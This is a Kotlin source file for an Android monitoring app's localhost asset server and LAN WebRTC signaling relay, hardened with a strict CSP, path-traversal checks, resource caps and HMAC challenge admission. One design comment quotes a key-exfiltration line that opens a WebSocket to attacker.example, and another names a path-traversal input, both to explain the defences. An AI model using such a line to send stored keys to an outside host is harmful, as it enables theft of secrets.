package com.tawny.monitor

import android.content.Context
import android.util.Log
import org.java_websocket.WebSocket
import org.java_websocket.drafts.Draft_6455
import org.java_websocket.handshake.ClientHandshake
import org.java_websocket.server.WebSocketServer
import org.json.JSONArray
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.OutputStream
import java.net.InetAddress
import java.net.InetSocketAddress
import java.net.ServerSocket
import java.net.Socket
import java.net.URLDecoder
import java.util.concurrent.CountDownLatch
import java.util.concurrent.Executors
import javax.crypto.Mac
import javax.crypto.spec.SecretKeySpec
import kotlin.concurrent.thread

/**
 * The one rendezvous host this build was compiled against, or null for a
 * LAN-only build.
 */
private val RENDEZVOUS_HOST: String? = BuildConfig.RENDEZVOUS_URL
    .takeIf { it.isNotBlank() }
    ?.removePrefix("wss://")?.removePrefix("ws://")
    ?.substringBefore('/')?.substringBefore('?')
    ?.takeIf { it.isNotBlank() }

/**
 * A LAN relay address is only ever `ws://<private-ipv4>:<port>`. Anything else
 * is not going into a CSP header: a stray space or newline in a source
 * expression would truncate the policy, and a hostname we cannot vouch for
 * would widen it.
 */
private val LAN_WS_RE = Regex("^ws://\\d{1,3}(\\.\\d{1,3}){3}:\\d{1,5}$")

/**
 * Placeholder in the bundled HTML's `<meta>` CSP, replaced at serve time with
 * the same source list the header carries. If it ever ships unsubstituted — an
 * asset opened straight off disk, say — it is an unknown source expression,
 * which CSP treats as matching nothing. That fails closed.
 */
private const val CONNECT_SRC_TOKEN = "__TAWNY_CONNECT_SRC__"

/**
 * `connect-src` for the pages this server hands out.
 *
 * It used to end in a blanket `https:`, and then in a blanket `ws:`. Dropping
 * the first while keeping the second fixed nothing: `ws:` is a *scheme-wide*
 * source, so `new WebSocket("ws://attacker.example/?k=" + key)` was allowed to
 * every host on the internet, and the channel key sitting in localStorage was
 * one injected script away from leaving the device. A scheme with no host is
 * not a restriction.
 *
 * The page only ever dials two things, and both are known by the time it is
 * served: the one rendezvous host compiled into the build, and the single relay
 * this session actually uses — `ws://127.0.0.1:<port>` on the Monitor (its own
 * relay, on a different port from `'self'`, so it needs naming) or
 * `ws://<monitor-lan-ip>:<port>` on a Handheld, learned from the pairing QR.
 * [AssetHttpServer.lanRelay] carries that address, so the policy names an exact
 * origin instead of a scheme.
 */
private fun connectSrc(lanRelay: String?): String = buildString {
    append("'self'")
    if (lanRelay != null) { append(' '); append(lanRelay) }
    RENDEZVOUS_HOST?.let { append(" wss://"); append(it); append(" https://"); append(it) }
}

private fun firstFreePort(start: Int): Int {
    for (p in start until start + 25) {
        try { ServerSocket(p).use { }; return p } catch (e: Exception) { /* taken */ }
    }
    return start
}

/**
 * Serves the web app (bundled in assets/web/) on 127.0.0.1 so the WebView
 * loads a real, secure-context origin — no address to type, and `http://`
 * localhost pages may still open a plain `ws://` to the Watcher on the LAN.
 * GET only, localhost only, a handful of small files.
 */
class AssetHttpServer(private val ctx: Context, preferredPort: Int) {

    val port: Int

    /**
     * The exact LAN relay origin this session dials, or null before one is
     * known. Set by [MainActivity.goLiveWith] before the WebView is pointed at
     * this server, and named verbatim in the `connect-src` of every page and
     * header it serves. A value that is not a plain `ws://<ipv4>:<port>` is
     * refused rather than trusted into the policy.
     */
    @Volatile var lanRelay: String? = null
        set(value) { field = value?.takeIf { LAN_WS_RE.matches(it) } }

    private val server: ServerSocket
    // Bounded, not newCachedThreadPool(): any other app on the device holding
    // INTERNET can open sockets to loopback, and an unbounded pool would let it
    // spawn threads until the process dies. Binding to 127.0.0.1 is not a UID
    // boundary.
    private val pool = java.util.concurrent.ThreadPoolExecutor(
        2, 8, 30, java.util.concurrent.TimeUnit.SECONDS,
        java.util.concurrent.ArrayBlockingQueue(32),
        java.util.concurrent.ThreadPoolExecutor.DiscardPolicy(),
    )
    @Volatile private var running = true

    init {
        var bound: ServerSocket? = null
        var p = preferredPort
        for (i in 0 until 25) {
            try {
                bound = ServerSocket(p, 50, InetAddress.getByName("127.0.0.1"))
                break
            } catch (e: Exception) { p++ }
        }
        server = bound ?: error("no free port for the local web server")
        port = server.localPort
        thread(name = "tawny-http", isDaemon = true) { loop() }
    }

    private fun loop() {
        while (running) {
            val sock = try { server.accept() } catch (e: Exception) { break }
            pool.submit {
                try { handle(sock) } catch (e: Exception) { /* client went away */ }
                finally { try { sock.close() } catch (e: Exception) {} }
            }
        }
    }

    private fun handle(sock: Socket) {
        // A caller that never finishes its request should not hold a worker.
        sock.soTimeout = 5_000
        val reader = BufferedReader(InputStreamReader(sock.getInputStream()))
        // readLine() with no bound would happily assemble a several-hundred-
        // megabyte request line or header and take the process with it.
        val requestLine = readLineCapped(reader) ?: return
        var headers = 0
        while (true) {
            val h = readLineCapped(reader) ?: break
            if (h.isEmpty()) break
            if (++headers > MAX_HEADERS) return
        }

        val parts = requestLine.split(" ")
        val out = sock.getOutputStream()
        if (parts.size < 2 || parts[0] != "GET") {
            send(out, 405, "text/plain", "method not allowed".toByteArray()); return
        }

        var path = URLDecoder.decode(parts[1].substringBefore('?'), "UTF-8")
        if (path.isEmpty() || path == "/") path = "/index.html"

        val rel = resolve(path) ?: run {
            send(out, 403, "text/plain", "forbidden".toByteArray()); return
        }

        var body = try {
            ctx.assets.open(rel).use { it.readBytes() }
        } catch (e: Exception) {
            send(out, 404, "text/plain", "not found".toByteArray()); return
        }
        // The page carries its own <meta> CSP as defence in depth, but a static
        // file cannot know the rendezvous host or this session's relay, so it
        // used to fall back to `connect-src ... ws: wss: https:` — a policy so
        // wide it granted back everything the header was busy withholding.
        // Browsers enforce every delivered policy independently, so the loosest
        // one is harmless in theory; in practice it was the policy that shipped
        // to anyone serving these assets without the header. Substituting the
        // real source list keeps the two in step from one definition.
        if (rel.endsWith(".html")) {
            body = String(body, Charsets.UTF_8)
                .replace(CONNECT_SRC_TOKEN, connectSrc(lanRelay))
                .toByteArray(Charsets.UTF_8)
        }
        send(out, 200, mime(path), body)
    }

    /**
     * Map a request path to an asset under web/, or null if it tries to climb
     * out. Resolved segment by segment rather than by stripping ".." — a
     * blocklist like that is defeated by inputs such as "....//".
     */
    private fun resolve(path: String): String? {
        val stack = ArrayList<String>()
        for (seg in path.split('/')) {
            when {
                seg.isEmpty() || seg == "." -> {}
                seg == ".." -> if (stack.isEmpty()) return null else stack.removeAt(stack.size - 1)
                seg.contains('\\') || seg.contains('\u0000') -> return null
                else -> stack.add(seg)
            }
        }
        if (stack.isEmpty()) return null
        return "web/" + stack.joinToString("/")
    }

    /** readLine(), but gives up instead of buffering an unbounded line. */
    private fun readLineCapped(reader: BufferedReader): String? {
        val sb = StringBuilder()
        while (true) {
            val c = reader.read()
            if (c < 0) return if (sb.isEmpty()) null else sb.toString()
            if (c == '\n'.code) return sb.toString().removeSuffix("\r")
            if (sb.length >= MAX_LINE) return null
            sb.append(c.toChar())
        }
    }

    private fun mime(path: String) = when (path.substringAfterLast('.', "")) {
        "html" -> "text/html; charset=utf-8"
        "js", "mjs" -> "text/javascript; charset=utf-8"
        "css" -> "text/css; charset=utf-8"
        "json" -> "application/json; charset=utf-8"
        "svg" -> "image/svg+xml"
        "png" -> "image/png"
        // The chime clips. decodeAudioData sniffs the container and would take
        // these as octet-stream anyway, but this server sends nosniff, so a
        // future <audio src> would be refused outright without the real type.
        "ogg", "oga" -> "audio/ogg"
        "mp3" -> "audio/mpeg"
        "webmanifest" -> "application/manifest+json; charset=utf-8"
        else -> "application/octet-stream"
    }

    private fun send(out: OutputStream, code: Int, type: String, body: ByteArray) {
        val head = "HTTP/1.1 $code X\r\n" +
            "Content-Type: $type\r\n" +
            "Content-Length: ${body.size}\r\n" +
            "Cache-Control: no-cache\r\n" +
            "X-Content-Type-Options: nosniff\r\n" +
            "Referrer-Policy: no-referrer\r\n" +
            "Content-Security-Policy: default-src 'none'; script-src 'self'; " +
            "style-src 'self'; img-src 'self' data: blob:; media-src 'self' blob:; " +
            "font-src 'self'; manifest-src 'self'; connect-src ${connectSrc(lanRelay)}; " +
            "base-uri 'none'; form-action 'none'; frame-ancestors 'none'\r\n" +
            "Connection: close\r\n\r\n"
        out.write(head.toByteArray(Charsets.US_ASCII))
        out.write(body)
        out.flush()
    }

    fun stop() {
        running = false
        try { server.close() } catch (e: Exception) {}
        pool.shutdownNow()
    }

    private companion object {
        const val MAX_LINE = 8 * 1024
        const val MAX_HEADERS = 64
    }
}

/**
 * The Monitor's WebRTC signaling relay, reachable on the LAN. Media never flows
 * through here — it is peer-to-peer and DTLS-encrypted regardless.
 *
 * Admission used to be "you sent a well-formed room id", which was no admission
 * at all: the room id travels in the WebSocket URL over plain `ws://`, so
 * anyone sharing the Wi-Fi could read one off the wire and then join the room
 * and be handed the live camera and microphone.
 *
 * Now every socket must answer a per-connection nonce with
 * `HMAC-SHA256(channel key, "tawny-lan-v1|" + nonce)`. The channel key is the
 * secret already shared by the pairing QR, it never goes on the wire, and a
 * captured response is worthless on the next connection. A socket is not put in
 * a room, not counted, and not announced to anyone until it answers.
 */
class SignalServer(
    preferredPort: Int,
    /** Current channel key, read fresh so a re-pair takes effect immediately. */
    private val secret: () -> String?,
) : WebSocketServer(
    InetSocketAddress(firstFreePort(preferredPort)),
    // Cap frames at the protocol level. Without this java-websocket will happily
    // buffer an arbitrarily large "ICE candidate" and take the Monitor's process
    // down with it; signalling frames are a few KB.
    listOf(Draft_6455(emptyList<org.java_websocket.extensions.IExtension>(), MAX_MSG)),
) {

    val boundPort: Int get() = port
    val ready = CountDownLatch(1)

    private class Meta(val id: String, val room: String, val role: String, val ip: String)
    /** A socket that has been challenged but has not answered yet. */
    private class Pending(val nonce: String, val room: String, val role: String,
                          val ip: String, val since: Long)
    private val rooms = HashMap<String, MutableMap<String, WebSocket>>()
    private val perIp = HashMap<String, Int>()
    private val pending = HashMap<WebSocket, Pending>()
    private val rng = java.security.SecureRandom()

    private fun hex(n: Int): String {
        val b = ByteArray(n); rng.nextBytes(b)
        return b.joinToString("") { "%02x".format(it) }
    }

    private fun expectedProof(nonce: String): String? {
        val key = secret() ?: return null
        return try {
            val mac = Mac.getInstance("HmacSHA256")
            mac.init(SecretKeySpec(key.toByteArray(Charsets.UTF_8), "HmacSHA256"))
            mac.doFinal("tawny-lan-v1|$nonce".toByteArray(Charsets.UTF_8))
                .joinToString("") { "%02x".format(it) }
        } catch (e: Exception) { null }
    }

    /** Constant-time compare, so a wrong answer leaks nothing by timing. */
    private fun constantEquals(a: String, b: String): Boolean {
        if (a.length != b.length) return false
        var d = 0
        for (i in a.indices) d = d or (a[i].code xor b[i].code)
        return d == 0
    }

    /** Close sockets that were challenged and never answered. */
    @Synchronized
    private fun sweepPending() {
        val cutoff = System.currentTimeMillis() - ADMIT_TIMEOUT_MS
        val stale = pending.entries.filter { it.value.since < cutoff }.map { it.key }
        for (c in stale) { pending.remove(c); try { c.close(4008, "no proof") } catch (e: Exception) {} }
    }

    private fun ipOf(conn: WebSocket) =
        conn.remoteSocketAddress?.address?.hostAddress ?: "?"

    override fun onStart() {
        connectionLostTimeout = 60
        maxPendingConnections = 32
        ready.countDown()
        sweeper = Executors.newSingleThreadScheduledExecutor { r ->
            Thread(r, "tawny-admit-sweep").apply { isDaemon = true }
        }.also {
            it.scheduleWithFixedDelay({ sweepPending() }, 2, 2, java.util.concurrent.TimeUnit.SECONDS)
        }
    }

    @Synchronized
    override fun onOpen(conn: WebSocket, handshake: ClientHandshake) {
        val query = (handshake.resourceDescriptor ?: "").substringAfter('?', "")
        val params = query.split('&').mapNotNull {
            val i = it.indexOf('=')
            if (i < 0) null else it.substring(0, i) to it.substring(i + 1)
        }.toMap()

        val ip = ipOf(conn)
        // Cap sockets per LAN host so one device can't fill the room map / peer
        // slots. Unanswered challenges count too, or the cap is trivially
        // sidestepped by never answering.
        val inFlight = (perIp[ip] ?: 0) + pending.count { it.value.ip == ip }
        if (inFlight >= MAX_PER_IP) { conn.close(4006, "too many"); return }
        if (pending.size >= MAX_PENDING) { conn.close(4005, "busy"); return }

        val room = params["room"]
        // A room id is sha256(channel key) — exactly 32 hex chars.
        if (room == null || !ROOM_RE.matches(room)) { conn.close(4000, "no room"); return }
        val role = if (params["role"] == "station") "station" else "viewer"
        if (rooms.size >= MAX_ROOMS && room !in rooms) { conn.close(4005, "busy"); return }

        // Deliberately do NOT create the room entry here. It used to be a
        // `getOrPut` above the rejection paths, so every refused connection left
        // a permanent empty room behind and walked the map toward MAX_ROOMS.
        val nonce = hex(16)
        pending[conn] = Pending(nonce, room, role, ip, System.currentTimeMillis())
        conn.send(JSONObject().put("type", "challenge").put("n", nonce).toString())
    }

    /** Second half of admission: verify the proof, then actually join the room. */
    private fun admit(conn: WebSocket, p: Pending, proof: String): Boolean {
        val want = expectedProof(p.nonce) ?: return false
        if (!constantEquals(proof.lowercase(), want)) return false

        val peers = rooms.getOrPut(p.room) { HashMap() }
        if (peers.size >= MAX_PER_ROOM) { conn.close(4003, "channel full"); return true }
        if (p.role == "station" &&
            peers.values.any { it.getAttachment<Meta>()?.role == "station" }
        ) {
            conn.close(4004, "monitor already running")
            if (peers.isEmpty()) rooms.remove(p.room)
            return true
        }

        val id = java.math.BigInteger(48, rng).toString(16).padStart(12, '0')
        conn.setAttachment(Meta(id, p.room, p.role, p.ip))
        peers[id] = conn
        perIp[p.ip] = (perIp[p.ip] ?: 0) + 1

        val others = JSONArray()
        for ((pid, pc) in peers) {
            if (pc === conn) continue
            others.put(
                JSONObject().put("id", pid)
                    .put("role", pc.getAttachment<Meta>()?.role ?: "viewer")
            )
        }
        conn.send(
            JSONObject().put("type", "welcome").put("id", id)
                .put("role", p.role).put("peers", others).toString()
        )
        for ((_, pc) in peers) {
            if (pc === conn) continue
            pc.send(
                JSONObject().put("type", "peer-joined").put("id", id).put("role", p.role).toString()
            )
        }
        return true
    }

    @Synchronized
    override fun onMessage(conn: WebSocket, message: String) {
        if (message.length > MAX_MSG) { conn.close(4009, "message too large"); return }

        // Still unadmitted: the only frame we accept is the challenge answer.
        pending[conn]?.let { p ->
            val msg = try { JSONObject(message) } catch (e: Exception) { return }
            if (msg.optString("type") != "hello") return
            val proof = msg.optString("r")
            if (!PROOF_RE.matches(proof)) { pending.remove(conn); conn.close(4008, "bad proof"); return }
            pending.remove(conn)
            if (!admit(conn, p, proof)) conn.close(4008, "bad proof")
            return
        }

        val meta = conn.getAttachment<Meta>() ?: return
        val msg = try { JSONObject(message) } catch (e: Exception) { return }
        if (msg.optString("type") !in RELAY) return
        val to = msg.optString("to")
        if (to.isEmpty()) return
        val target = rooms[meta.room]?.get(to) ?: return
        if (target === conn) return
        msg.put("from", meta.id)
        target.send(msg.toString())
    }

    @Synchronized
    override fun onClose(conn: WebSocket, code: Int, reason: String?, remote: Boolean) {
        pending.remove(conn)
        val meta = conn.getAttachment<Meta>() ?: return
        val n = (perIp[meta.ip] ?: 1) - 1
        if (n <= 0) perIp.remove(meta.ip) else perIp[meta.ip] = n
        val peers = rooms[meta.room] ?: return
        peers.remove(meta.id)
        if (peers.isEmpty()) { rooms.remove(meta.room); return }
        for (pc in peers.values) {
            pc.send(JSONObject().put("type", "peer-left").put("id", meta.id).toString())
        }
    }

    override fun onError(conn: WebSocket?, ex: Exception) {
        Log.w("Tawny", "signal server error", ex)
    }

    private var sweeper: java.util.concurrent.ScheduledExecutorService? = null

    override fun stop(timeout: Int) {
        sweeper?.shutdownNow(); sweeper = null
        super.stop(timeout)
    }

    companion object {
        // Addressed control messages this relay will forward.
        //
        // This set must list every addressed `type` public/app.js sends through
        // sig(). A type missing here is not an error anywhere — it is dropped in
        // silence, and the feature it carries simply never happens on this
        // transport. That has now bitten twice: first "cameras", "meta" and
        // "camera-control" (lens picker, remote zoom, pet-name sync), and then
        // "torch", which is why the Viewer's Light key sat greyed out on a phone
        // whose LED works perfectly — the Monitor's "I have a light" never
        // arrived, and the press never got back. Add the type here, in
        // rendezvous/room.js and in server.js together, or it works on one
        // transport and mysteriously not the others.
        private val RELAY = setOf(
            "offer", "answer", "ice", "bye", "chime", "chime-ack", "talking",
            "cameras", "meta", "camera-control", "torch", "battery"
        )
        private val ROOM_RE = Regex("^[0-9a-f]{32}$")
        private val PROOF_RE = Regex("^[0-9a-fA-F]{64}$")
        private const val MAX_ROOMS = 32
        private const val MAX_PER_IP = 8
        // 1 Monitor + up to 3 Viewers. Mirrors public/app.js MAX_VIEWERS and
        // the rendezvous. Fixed at three: nothing reads a pref or an intent
        // extra to raise it.
        private const val MAX_PER_ROOM = 4
        /** Sockets challenged but not yet admitted. */
        private const val MAX_PENDING = 64
        private const val ADMIT_TIMEOUT_MS = 5_000L
        /** Signalling frames are a few KB; anything larger is an attack. */
        private const val MAX_MSG = 64 * 1024
    }
}
